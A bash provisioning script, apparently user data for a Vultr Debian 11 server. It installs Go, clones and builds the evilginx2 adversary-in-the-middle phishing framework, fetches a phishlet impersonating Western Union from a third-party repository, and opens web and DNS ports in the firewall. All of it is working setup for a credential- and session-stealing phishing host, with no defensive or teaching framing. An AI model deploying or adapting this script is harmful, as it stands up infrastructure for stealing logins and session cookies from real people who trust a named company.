#!/bin/bash
DEBIAN_FRONTEND=noninteractive apt-get update -y && \
  DEBIAN_FRONTEND=noninteractive apt-get -o "Dpkg::Options::=--force-confold" dist-upgrade -y && \
  # These libs are only needed for the build of evilnginx2 from source
  # Also installs tmux, my beloved
  DEBIAN_FRONTEND=noninteractive apt-get -o "Dpkg::Options::=--force-confold" install git nodejs npm tmux -y

mkdir -p /home/eviluser/

# Install golang 1.22 (only needed for building evilnginx2 from source)
wget -O /home/eviluser/go1.22.0.linux-amd64.tar.gz https://go.dev/dl/go1.22.0.linux-amd64.tar.gz && \
  rm -rf /usr/local/go && tar -C /usr/local -xzf /home/eviluser/go1.22.0.linux-amd64.tar.gz

# Set PATH and other necessary environment variables
echo "export GOROOT=/usr/local/go" >> /etc/profile
echo "export GOPATH=\$HOME/go" >> /etc/profile
echo "export PATH=\$PATH:/usr/local/go/bin:\$GOPATH/bin" >> /etc/profile

# Apply the environment variables immediately for the current session
export HOME=/home/eviluser
export GOROOT=/usr/local/go
export GOPATH=$HOME/go
export PATH=$PATH:/usr/local/go/bin:$GOPATH/bin

# Honestly the build process as a whole doesn't need to be executed every time the instance(s) spin up
# Can just build on a dedicated builder instance and ship to S3 or something, then download to live host
git clone https://github.com/kgretzky/evilginx2.git /home/eviluser/evilnginx2-source && \
    make -C /home/eviluser/evilnginx2-source

mkdir -p /home/eviluser/evilnginx/phishlets
mkdir /home/eviluser/evilnginx/redirectors
cp -r /home/eviluser/evilnginx2-source/build/* /home/eviluser/evilnginx

# Install an example phishlet from someone's repo
curl -o /home/eviluser/evilnginx/phishlets/westernunion.yaml https://raw.githubusercontent.com/An0nUD4Y/Evilginx2-Phishlets/master/westernunion.yaml

# Cleanup
rm -rf /home/eviluser/go1.22.0.linux-amd64.tar.gz

# Vultr's Debian 11 image uses UFW by default, so we have to add some firewall rules here
ufw allow 80/tcp
ufw allow 443/tcp
ufw allow 53